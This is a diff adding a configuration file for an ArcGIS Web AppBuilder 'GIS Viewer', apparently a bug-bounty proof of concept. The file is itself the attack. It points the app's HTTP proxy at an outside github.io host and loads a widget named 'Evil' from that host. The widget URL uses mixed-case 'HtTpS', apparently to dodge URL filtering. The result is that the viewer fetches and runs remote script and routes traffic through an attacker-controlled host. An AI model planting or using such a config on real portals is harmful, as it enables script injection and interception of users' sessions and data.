@@ -1,0 +1,33 @@
+{
+  "wabVersion": "2.33",
+  "portalUrl": "https://dbb.1und1.net/portal",
+  "title": "GIS Viewer",
+  "theme": {
+    "name": "FoldableTheme",
+    "styles": ["default"],
+    "customStyles": { "mainBackgroundColor": "" }
+  },
+  "map": {
+    "itemId": "REPLACE_WITH_A_PUBLIC_WEBSCENE_ID",
+    "mapOptions": {}
+  },
+  "httpProxy": {
+    "useProxy": true,
+    "alwaysUseProxy": false,
+    "url": "https://bugbounty-web.github.io/a.esri.com/proxy"
+  },
+  "widgetOnScreen": {
+    "widgets": [
+      {
+        "id": "_evil",
+        "name": "Evil",
+        "uri": "HtTpS://bugbounty-web.github.io/a.esri.com/widgets/Evil/Widget",
+        "hasLocale": true,
+        "hasConfig": false,
+        "hasStyle": false,
+        "hasUIFile": false,
+        "position": { "left": 10, "top": 10, "width": 2, "height": 2 }
+      }
+    ]
+  }
+}
